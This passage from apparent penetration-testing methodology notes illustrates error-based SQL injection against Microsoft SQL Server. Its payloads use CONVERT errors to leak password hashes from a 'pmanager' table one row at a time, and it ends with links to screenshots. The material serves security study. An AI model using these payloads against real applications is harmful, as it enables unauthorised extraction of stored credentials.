...
1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager)))--
 ...
 1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN ('7de6b6f0afadd89c3ed558da43930181'))))--
  ...
  etc etc... Again, we could only get one datapoint at a time, so doing it this way works.![unnamed_25b647a110814ef680a8ae9cc7353da6](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/Error%20based/Example/{{notename}}-202605011506.png)
![unnamed_cdbb63a585e84537831253d0d30a4f48](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/Error%20based/Example/{{notename}}-202605011506-1.png)
![unnamed_1dc17a99dc0842a894efc890ec62bc71](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/Error%20based/Example/{{notename}}-202605011506-2.png)
